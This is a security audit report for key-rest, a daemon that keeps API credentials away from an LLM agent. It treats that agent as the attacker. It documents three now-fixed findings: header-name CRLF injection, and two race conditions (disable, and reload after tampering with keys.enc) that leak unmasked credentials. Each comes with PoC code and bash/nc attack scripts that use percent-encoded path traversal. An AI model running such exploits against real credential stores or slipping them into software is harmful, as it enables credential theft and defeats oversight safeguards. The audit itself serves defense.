[English](audit-speca.md) | [Japanese](audit-speca-ja.md)

# SPECA-style Security Audit of key-rest

**Audit date**: 2026-05-10

This document records a structured security audit of key-rest performed using the methodology of the [SPECA](https://github.com/NyxFoundation/speca) framework: derive formal properties from the specification (CLAUDE.md, README, threat model), then perform proof-attempt audits against the implementation. Findings are PoC-confirmed before reporting.

## Audit Summary

- **Subgraphs (functional units):** 9 — SG-001 … SG-009
- **Properties audited:** 30 — P-001 … P-030
- **Findings:** 3, all fixed
- **Hardening (no F-xxx):** Transfer-Encoding stripped from outbound requests (commit `4b7bc94`).
- **Defense-in-depth follow-ups not yet applied:** authenticate `disable` / `reload` socket commands; fail-closed on `mlock` failure; per-connection read deadline on the socket scanner.

### Findings table

| ID | Title | Severity | Fix commit | Hacking-challenge breach? |
|---|---|---|---|---|
| F-001 | Header Key CRLF Injection | HIGH | `0ed5257` | ✅ **No** — the challenge environment registers every key with `--allow-only-*`, so the placement check rejects the malicious header key (`strings.EqualFold("Authorization", "Authorization\r\nLog-Echo")` is false). The finding is real but only exploitable against a daemon running keys in legacy mode (the default before any `--allow-only-*` flag is set). |
| F-002 | Disable/Mask Race Condition | CRITICAL | `788937c` | 🚨 **Yes** — works against the challenge configuration (modern `--allow-only-*` keys) because the attack does not depend on the placement policy. Validation passes normally; the agent races a `disable` socket command against the in-flight request, and the response masker — reading the live keystore at mask time — skips the now-disabled key. PoC at natural localhost timing won 173 / 200 attempts before the fix. |
| F-003 | Reload + `keys.enc` Tampering Race | CRITICAL | `788937c` | 🚨 **Yes** — same logical race as F-002, reached without the master passphrase: the agent deletes the target entry from `keys.enc` (a JSON edit) and triggers `reload` over the unauthenticated socket. Independent of placement policy, so it would have breached the challenge environment. |

## Bug Bounty Scope

| Item | Definition |
|---|---|
| Attacker model | LLM agent that crafts arbitrary JSON requests over the Unix socket via key-rest client libraries |
| Out-of-scope | Daemon process memory readout (`PR_SET_DUMPABLE=0`), `keys.enc` read (perms 0600), root user, daemon binary tampering |
| In-scope entry points | (1) Unix socket protocol (JSON-over-newline), (2) HTTP/HTTPS responses from external services |
| Goal | Exfiltrate the raw bytes of `DecryptedKey.Value` to the agent |

## Functional Units (Subgraphs)

| ID | Unit | Source |
|---|---|---|
| SG-001 | REQUEST-DISPATCH | `internal/server/server.go` |
| SG-002 | PROXY-VALIDATE   | `internal/proxy/proxy.go::validateField` |
| SG-003 | URI-PARSE        | `internal/uri/uri.go::FindAll` |
| SG-004 | URI-RESOLVE      | `internal/uri/uri.go::ReplaceBytes` |
| SG-005 | HTTP-PROXY       | `internal/proxy/sectransport.go::RoundTrip` |
| SG-006 | RESP-MASK        | `internal/proxy/proxy.go::maskCredentials` etc. |
| SG-007 | KEY-MGMT         | `internal/keystore/keystore.go::Add/Disable/Enable` |
| SG-008 | DAEMON-START     | `internal/daemon/daemon.go::Start` |
| SG-009 | CRYPTO           | `internal/crypto/crypto.go` |

## Properties Audited

Properties derived via STRIDE analysis (Phase 01e methodology), focused on credential exfiltration paths.

| ID | Property | Subgraph | Result |
|---|---|---|---|
| P-001 | Decrypted credential bytes appear on the wire only in fields permitted by the placement policy. | SG-005 | 🚨 **VIOLATED → F-001** (legacy mode only) |
| P-002 | URL request line is free of CRLF / control bytes. | SG-005 | Holds (Go `url.Parse` rejects). |
| P-003 | HTTP method is a valid RFC 7230 token. | SG-005 | Holds (Go `http.NewRequest` rejects). |
| P-004 | `validateField` is called before any URI is resolved against the keystore. | SG-002 | Holds (verified in `proxy.go:133-145`). |
| P-005 | `url_prefix` boundary check prevents subdomain attacks. | SG-002 | Holds (`hasURLPrefix` requires `/`, `?`, `#`, or end-of-string after prefix). |
| P-006 | URL with userinfo (`https://...@evil.com/`) is rejected. | SG-002 | Holds (`proxy.go:121`). |
| P-007 | Path traversal `/../` is rejected. | SG-002 | 🚨 Holds for literal `/../`; **percent-encoded `/%2e%2e/` bypasses** (used as a stepping stone for F-002). |
| P-008 | Plaintext HTTP is rejected. | SG-002 | Holds (`proxy.go:115`). |
| P-009 | Resolved buffers are zero-cleared on TLS dial failure. | SG-005 | Holds (`sectransport.go:182`). |
| P-010 | The credential set known to `maskCredentials` is consistent with the credentials that have been written to the wire. | SG-006 | 🚨 **VIOLATED → F-002 / F-003** (any operation that mutates `s.decrypted` between resolution and masking — `Disable`, `Reload` after on-disk edit — removes the credential from the masker's set). |
| P-011 | The `disable` / `enable` / `reload` / `list` socket commands are reachable only by privileged callers. | SG-001 | 🚨 Violated (no auth, agent can call them all). Required for F-002 and F-003. |
| P-012 | `keys.enc` integrity cannot be broken without the master passphrase. | SG-007 | 🚨 **Partially violated**: deleting an entry (a plain JSON edit) does not require the passphrase. Required for F-003. |
| P-013 | Agent-supplied `Transfer-Encoding` does not reach the wire alongside the daemon-added `Content-Length`. | SG-005 | Holds (commit `4b7bc94`: stripped in `secureTransport.RoundTrip`). Regression: `bodysmuggle_poc_test.go::TestTransferEncodingStrippedFromWire`. |
| P-014 | A `Disable` racing against `validateField` cannot leak credential bytes to the agent. | SG-002 | Holds — the post-fix flow either rejects the request (KEY_DISABLED) or masks the response via the validation-time snapshot. Regression: `bodysmuggle_poc_test.go::TestValidationRaceDoesNotLeak`. |
| P-015 | `enable`, `list`, `version` socket commands do not return credential VALUES. | SG-001 | Holds — `list` returns `KeyStatus` (URI / URLPrefix / placement / Disabled, no Value); `enable` returns count; `version` returns the version string. |
| P-016 | The socket request size is capped to prevent unbounded memory allocation. | SG-001 | Holds (`server.go::maxRequestSize = 10 MB`). |
| P-017 | The socket caps concurrent connections to prevent fd exhaustion. | SG-001 | Holds (`server.go::maxConcurrentConns = 64`). |
| P-018 | URI parser regular expressions do not catastrophically backtrack. | SG-003 | Holds (Go `regexp` uses RE2; the patterns in `uri.go` are linear). |
| P-019 | `uri.ReplaceBytes` size accounting cannot overflow. | SG-004 | Holds — sizes are bounded by the agent-supplied request size (≤ `maxRequestSize`); `int` accounting is sufficient on 64-bit hosts. |
| P-020 | `Add` and `Remove` are not reachable via the agent-facing socket. | SG-007 | Holds — `server.go` switch only exposes `reload` / `enable` / `disable` / `list` / `version` / `http`. |
| P-021 | A failed `DecryptAll` leaves the keystore in a consistent state. | SG-008 | Holds — on failure `clearDecrypted` zero-clears the partial new slice and returns the error without mutating `s.decrypted`. |
| P-022 | The daemon refuses to start if `PR_SET_DUMPABLE=0` cannot be applied. | SG-008 | Holds (`daemon.go:86-88` returns the error). |
| P-023 | The master passphrase is mlocked while the daemon runs and zero-cleared on shutdown. | SG-008 | Holds (`daemon.go:97-98` mlocks; `daemon.go:167` zero-clears via `ZeroClearAndMunlock`). |
| P-024 | AES-256-GCM nonces are unique per `Encrypt` call. | SG-009 | Holds — `crypto.go:53-56` reads a fresh 12-byte nonce from `crypto/rand` for every encryption. |
| P-025 | The PBKDF2 salt is unique per `Encrypt` call. | SG-009 | Holds — `crypto.go:34-37` reads a fresh 16-byte salt per encryption, so each entry's derived key is independent even when the master passphrase is reused. |
| P-026 | The PBKDF2 iteration count meets current OWASP guidance (≥ 600,000 for SHA-256). | SG-009 | Holds (`crypto.go:21::PBKDF2Iter = 600_000`). |
| P-027 | `Decrypt` returns an opaque error that does not distinguish "wrong passphrase" from "tampered ciphertext". | SG-009 | Holds (`crypto.go:95::"decryption failed: wrong passphrase or corrupted data"`). |
| P-028 | `Mlock` failure aborts daemon startup. | SG-009 | 🚨 **Soft-fail**: `crypto.Mlock` only logs a warning and continues. If `RLIMIT_MEMLOCK` is too low, decrypted credentials may be swapped to disk. Out of scope for credential exfiltration to the agent (no agent-reachable channel exposes swap), but worth tightening to fail-closed. |
| P-029 | The outbound TLS handshake refuses TLS &lt; 1.2. | SG-005 | Holds — Go ≥ 1.20 sets the default client `MinVersion` to TLS 1.2; the daemon does not lower it. |
| P-030 | `crypto.ZeroClear` is not optimized away by the Go compiler. | SG-009 | Holds in practice (the slice escapes via the parameter, so the writes are not dead). Defensive `runtime.KeepAlive` would harden against future compiler changes; out of current scope. |

---

## F-001 — Header Key CRLF Injection (HIGH)

### Summary
The CRLF check in `secureTransport.RoundTrip` is applied only to header **values**, not to header **keys**. An attacker who controls request headers can inject arbitrary headers into the wire request by embedding `\r\n` in the header name. Combined with legacy mode (the default for `key-rest add` without `--allow-only-*`), this allows the credential value to be placed in an attacker-named header on the outgoing TLS request.

### Code references

`internal/proxy/sectransport.go:107-117`
```go
// Reject CRLF injection in resolved header values
if containsCRLF(resolved) {
    ...
    return nil, fmt.Errorf("CRLF injection detected in header %s", key)
}
resolvedHeaders = append(resolvedHeaders, resolvedHeader{key, resolved})
```

The check is on `resolved` (the value). `key` (the header name) is appended verbatim.

`internal/proxy/sectransport.go:150-154`
```go
for _, h := range resolvedHeaders {
    n += copy(buf[n:], h.key)        // raw write — no validation
    n += copy(buf[n:], ": ")
    n += copy(buf[n:], h.value)
    n += copy(buf[n:], "\r\n")
}
```

`h.key` is written to the mlocked buffer as-is, then sent over TLS.

Go's `http.Header.Set` calls `textproto.CanonicalMIMEHeaderKey`, which returns the input unchanged if it contains a non-token byte (per `validHeaderFieldByte`). So `\r\n` in the key survives `Set` and reaches the raw HTTP builder.

### Reproduction

PoC test: `internal/proxy/headerinject_poc_test.go::TestHeaderKeyInjectionRawWire`

```go
store.Add("user1/ts/key", "https://localhost/",
    false, false, nil, []byte("SUPER-SECRET-CREDENTIAL-XYZ"), pass)
// ...
p.Handle(&Request{
    Type: "http", Method: "GET", URL: "https://localhost/",
    Headers: map[string]string{
        "Authorization\r\nLog-Echo": "Bearer key-rest://user1/ts/key",
    },
})
```

Captured raw TLS payload (decrypted at the listener):
```
GET / HTTP/1.1
Host: localhost
Connection: close
Authorization
Log-Echo: Bearer SUPER-SECRET-CREDENTIAL-XYZ

```

The credential `SUPER-SECRET-CREDENTIAL-XYZ` is now in a header named `Log-Echo`, which the daemon's placement policy never sanctioned.

### Exploitability

The attack requires:

1. A daemon-registered key in **legacy mode** (default — no `--allow-only-*` flag), OR a modern mode key with `--allow-only-header X` where the agent uses exactly `X` as the legitimate part of the injected key.
2. A way to recover the injected header value, which fits at least one of:
   - **Malicious upstream**: the attacker controls the server matching the key's `url_prefix`. The attacker reads the credential from the upstream's request log.
   - **Shared infrastructure**: the upstream forwards or logs all incoming headers in a location the attacker can read (CDN logs, debug endpoints, error responses that echo headers, support-ticket request dumps).
   - **Intermediary confusion**: a proxy or WAF in front of the upstream interprets the split request differently than the upstream itself, causing the credential to be routed to attacker-readable infrastructure.

The PoC demonstrates condition (1) and (2-malicious-upstream) under the legacy-mode default.

The attack is **not** mitigated by:
- Response-body credential masking (`maskCredentials`) — the credential never appears in a response the daemon parses; it leaves the daemon via a different upstream-side channel.
- `url_prefix` checks — the request is sent to the legitimate URL; only the credential's *position within the request* is hijacked.
- TLS — the credential is encrypted in transit but available in cleartext at the upstream.

### Severity

**HIGH** under the SPECA / Sherlock criteria: a single attacker-crafted request can directly exfiltrate the credential when the upstream is attacker-controlled or shares headers with attacker-readable storage. The attack is replayable, requires no special timing, and works against the default configuration.

### Fix

Reject any header name that is not a valid RFC 7230 token before resolution. Either:

```go
// Option A: reject CRLF in keys (minimum fix)
if containsCRLF([]byte(key)) {
    crypto.ZeroClear(resolvedBody)
    crypto.ZeroClear(resolvedURI)
    return nil, fmt.Errorf("CRLF injection detected in header name %q", key)
}

// Option B: full RFC 7230 token validation (preferred)
for _, c := range []byte(key) {
    if !isValidHeaderNameByte(c) {
        return nil, fmt.Errorf("invalid character in header name %q", key)
    }
}
```

The same check should also be applied earlier in `proxy.Handle` so the request is rejected before any URI resolution.

### Status

**Fixed in commit `0ed5257`.** `Proxy.Handle` now rejects any header name that is not an RFC 7230 token (`isValidHeaderName` in `internal/proxy/sectransport.go`) before URI resolution. Regression: `internal/proxy/headerinject_poc_test.go::TestHeaderKeyInjectionRejected`.

---

## F-002 — Disable/Mask Race Condition (CRITICAL)

### Summary
`maskCredentials` skips keys whose `Value` is nil (the state set by `Disable`). An attacker who can issue both an HTTP request and a `disable` command in parallel can race the disable into the window between resolution (where the credential is committed to the wire) and response masking. When the masker runs after disable, the credential bytes appearing in the response body are not recognised and are returned to the agent verbatim.

### Code references

`internal/proxy/proxy.go:443-471`
```go
func (p *Proxy) maskCredentials(s string) string {
    p.store.RLock()
    decrypted := p.store.Decrypted()
    p.store.RUnlock()
    ...
    for _, dk := range sorted {
        if len(dk.Value) > 0 {        // disabled keys (nil Value) are skipped
            ...
            s = strings.ReplaceAll(s, raw, replacement)
        }
    }
    return s
}
```

`internal/keystore/keystore.go:330-344`
```go
func (s *Store) Disable(uriPrefix string) int {
    s.mu.Lock()
    defer s.mu.Unlock()
    ...
    crypto.ZeroClearAndMunlock(s.decrypted[i].Value)
    s.decrypted[i].Value = nil
    s.decrypted[i].Disabled = true
}
```

`internal/server/server.go:160-162`
```go
case "disable":
    s.handleEnableDisable(conn, line, false)
```

The `disable` socket command is unauthenticated — any process with socket access (i.e., the agent) can issue it.

### Race window

`proxy.Handle` (`internal/proxy/proxy.go:109-214`) runs without holding any lock between `validateField` (which obtains `dk` via `store.Lookup`) and `maskCredentials`. In particular:

1. Agent sends HTTP request → `validateField` succeeds (key is enabled).
2. Daemon copies the credential into a wire buffer and sends the TLS request.
3. **Daemon waits for the upstream response (no lock held).**
4. Daemon reads the response.
5. Daemon calls `maskCredentials` (which acquires the read lock and reads `s.decrypted`).

If `Disable()` runs between (2) and (5), step (5) sees `Value == nil` for the targeted key(s) and skips masking.

### Reproduction

PoC tests in `internal/proxy/raceattack_poc_test.go`:

- `TestDisableMaskRacePoC` — uses an artificial mutex to widen the race window. Always wins. Confirms the leak is logically present.
- `TestDisableMaskRaceMultipleAttempts` — runs 200 trials with natural localhost network timing. **173/200 (≈86.5%) wins** — i.e., the credential bytes appear unmasked in the response body.

Wire-level attack from the agent:

```bash
SOCKET=~/.key-rest/key-rest.sock

(
  printf '{"type":"http","method":"GET","url":"https://localhost:9443/openai/%%2e%%2e/echo/x",'
  printf '"headers":{"Authorization":"Bearer key-rest://user1/openai/api-key"}}\n'
  cat
) | nc -U "$SOCKET" > response.json &

sleep 0.0001
echo '{"type":"disable","uri_prefix":"user1/"}' | nc -U "$SOCKET" >/dev/null
wait
# response.json: {"headers":{"Authorization":"Bearer <RAW_CREDENTIAL>"}, ...}
```

The path-traversal segment `/openai/%2e%2e/echo/` lets any `https://localhost:9443/openai/`-prefixed key reach the test-server's `/echo/` reflector: the proxy's prefix check sees the literal raw URL (which still starts with `/openai/`), while Go's `http.ServeMux` on the upstream side normalises `r.URL.Path` from `/openai/../echo/x` to `/echo/x`. The reflector echoes the resolved `Authorization` header into the response body.

### Severity

**CRITICAL**. Single-attempt success probability ≈86% on localhost with no tuning. The default daemon configuration is sufficient; no special key options or upstream cooperation is required beyond a reflection endpoint, which is satisfied by the bundled test-server (`/echo/`) and reachable via path traversal from any service prefix. The attack is replayable until any matching prefix exists in the keystore.

### Fix

Two complementary changes:

1. **Snapshot the credential bytes at validation time**, and use that snapshot when masking the response — do not re-read `s.decrypted` after the request leaves the daemon. The `Proxy.Handle` flow can build a `[]keyMask{ uri, value }` list during validation (the bytes are already in mlocked memory at this point) and pass it explicitly to the masker.
2. **Authenticate or remove the `disable` socket command** from the agent-facing protocol. The agent has no legitimate need to disable keys; that is an admin operation. A separate admin socket (or a CLI-only path that never opens the public socket) eliminates the attack surface.

Either change alone closes F-002. Both are recommended.

### Status

**Fixed.** Change (1) implemented in commit `788937c`: `Proxy.snapshotCredentials` copies all decrypted credentials (mlocked) at request validation time, and `maskCredentials` / `maskTruncatedKeys` / `maskPercentEncoded` operate on this snapshot rather than re-reading the live keystore. Concurrent `disable` after resolution can no longer remove a credential from the masker's set. Change (2) (authenticating the `disable` socket command) is left as a defense-in-depth follow-up. Regression: `internal/proxy/raceattack_poc_test.go::TestDisableDuringRequestDoesNotLeak` and `TestDisableDuringRequestNaturalTimingDoesNotLeak`.

---

## F-003 — Reload + `keys.enc` Tampering Race (CRITICAL)

### Summary
The same logical race as F-002, reached via a different state-mutation operation. The agent removes the target entry from `keys.enc` on disk (a JSON edit; no master passphrase required) and then triggers `reload` via the unauthenticated socket command. Reload re-decrypts only the surviving entries, so the in-memory `s.decrypted` no longer contains the targeted credential. When the in-flight request's response is masked, the credential bytes are not recognised and leak verbatim.

### Why the master passphrase is not needed

`keys.enc` is a JSON file owned by the daemon user (mode 0600). The agent runs under the same user (per the challenge threat model), so it has full read/write access to this file. The encryption only protects the credential VALUES; deleting an entire entry (URI + URLPrefix + EncryptedValue) requires no cryptographic capability — it is a straight JSON edit. Reload (`store.DecryptAll`) iterates only the entries present in the file, so the deleted entry simply disappears.

### Reproduction

PoC test: `internal/proxy/raceattack2_poc_test.go::TestReloadMaskRacePoC` — confirmed leak.

Wire-level attack:

```bash
SOCKET=~/.key-rest/key-rest.sock
KEYS=~/.key-rest/keys.enc

# 1. Read keys.enc, remove the target entry, write back. No passphrase used.
python3 -c '
import json, sys
data = json.load(open(sys.argv[1]))
data["keys"] = [k for k in data["keys"] if k["uri"] != "user1/target/key"]
json.dump(data, open(sys.argv[1], "w"))
' "$KEYS"

# 2. Send the HTTP request that will reflect the credential
(
  printf '{"type":"http","method":"GET","url":"https://localhost:9443/openai/%%2e%%2e/echo/x",'
  printf '"headers":{"Authorization":"Bearer key-rest://user1/target/key"}}\n'
  cat
) | nc -U "$SOCKET" > response.json &

# 3. Race the reload in
sleep 0.0001
echo '{"type":"reload"}' | nc -U "$SOCKET" >/dev/null

wait
# response.json contains the credential unmasked
```

### Compared to F-002

| | F-002 (disable) | F-003 (reload + tamper) |
|---|---|---|
| Required capability | socket access only | socket access **and** keys.enc write |
| Stealth | `list` shows the key as `disabled=true` | No trace — the entry is simply gone after reload |
| Recovery for the daemon | Agent or admin runs `enable` | Admin must restart the daemon to re-load the original `keys.enc` (the file is permanently modified) |
| Master passphrase needed | No | No |

### Severity

**CRITICAL**, same root cause as F-002.

### Fix

Same fix as F-002: snapshot the credential bytes at validation time and mask against that snapshot, not against live keystore state. This single change closes both F-002 and F-003 (and any future operation that mutates `s.decrypted`). Independently of that, the unauthenticated `reload` socket command is questionable — the agent has no legitimate reason to trigger a re-decryption.

### Status

**Fixed.** Closed by the same snapshot change as F-002 (commit `788937c`). The masker uses the validation-time snapshot, so a `reload` after `keys.enc` tampering removes the credential from `s.decrypted` but not from the snapshot. Regression: `internal/proxy/raceattack2_poc_test.go::TestReloadAfterTamperDoesNotLeak`.

---

## Vectors checked and not exploitable

| Vector | Outcome |
|---|---|
| URL CRLF injection (`https://host/path\r\nHeader: x`) | Blocked by Go `net/url.Parse` (`invalid control character in URL`). |
| Method CRLF (`"GET\r\nEvil: x"`) | Blocked by Go `http.NewRequest` (`invalid method`). |
| `Host` header override | `secureTransport.go:94` skips agent-supplied `Host`. |
| Subdomain prefix attack (`https://api.example.com.evil.com/`) | `hasURLPrefix` requires `/`, `?`, `#`, or end-of-string boundary after prefix. |
| `https://...@evil.com/` userinfo trick | Rejected at `proxy.go:121`. |
| Path traversal `/../` | Rejected at `proxy.go:128`. |
| Plain HTTP | Rejected at `proxy.go:115`. |
| Body smuggling via agent-supplied `Transfer-Encoding` | Stripped at the wire builder (commit `4b7bc94`). Even before the strip, the smuggled second-request response was unreachable to the agent (daemon uses `Connection: close` and reads only one response). See P-013. |
| `Disable` / `Reload` racing against `validateField` | Snapshot fix (commit `788937c`) ensures the masker uses the validation-time snapshot. See P-014. |
| Concurrent connection / large-line DoS on the socket | Out of scope (DoS, not exfiltration). The 10 MB request cap and 64-connection ceiling bound the impact. See P-016 / P-017. |
| Catastrophic backtracking in URI parser | Go `regexp` is RE2 (linear time). See P-018. |
| Race conditions on `s.decrypted` (Disable, Reload, Disable→Enable→Disable churn, parallel requests) | The snapshot fix (commit `788937c`) makes the masker operate on a per-request copy taken at validation time. `Add`/`Remove` are not reachable over the agent socket (P-020). |
| Go immutable-string residues from response masking | Not exploitable under the project's threat model (`PR_SET_DUMPABLE=0` blocks same-user `/proc/PID/mem` reads). A `[]byte`-based mask reimplementation would be required if the threat model expanded to root or disk forensics. See [`docs/memory.md`](memory.md) §Phase 4. |
| Slow-loris on the socket scanner | DoS only — out of scope. P-017 already bounds the parallel-connection count at 64; a per-connection read deadline would be appropriate defense-in-depth. |
| Snapshot mlock pressure under many slow requests | DoS only; bounded by `RLIMIT_MEMLOCK` and the 30s request timeout. |
| PID-file race / multi-start race | Out of scope — the attacker cannot run `key-rest start` without the master passphrase. |
